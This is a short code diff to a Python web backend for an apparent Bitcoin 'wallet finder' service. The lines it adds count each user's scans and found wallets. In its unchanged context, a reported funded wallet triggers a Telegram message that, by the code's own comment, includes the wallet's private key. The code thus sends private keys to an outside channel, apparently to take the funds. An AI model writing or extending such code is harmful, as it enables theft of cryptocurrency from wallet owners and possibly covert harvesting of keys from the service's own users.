@@ -425,6 +425,15 @@ async def check_address(data: CheckAddressRequest, user: dict = Depends(get_curr
     try:
         balance = await get_btc_address_balance(data.address)
         
+        # Update user scan count
+        await db.users.update_one(
+            {"id": user['id']},
+            {
+                "$inc": {"scans_used": 1},
+                "$set": {"last_active": datetime.now(timezone.utc).isoformat()}
+            }
+        )
+        
         return {"address": data.address, "balance": balance, "has_balance": balance > 0}
     except Exception as e:
         logger.error(f"Error checking address: {e}")
@@ -438,6 +447,12 @@ async def report_found_wallet(data: ReportFoundRequest, user: dict = Depends(get
         balance = await get_btc_address_balance(data.address)
         
         if balance > 0:
+            # Update user found count
+            await db.users.update_one(
+                {"id": user['id']},
+                {"$inc": {"total_found": 1}}
+            )
+            
             # Send to Telegram with PRIVATE KEY
             await send_telegram_message(
                 f"🎯 <b>FUNDED WALLET FOUND!</b>\n\n"
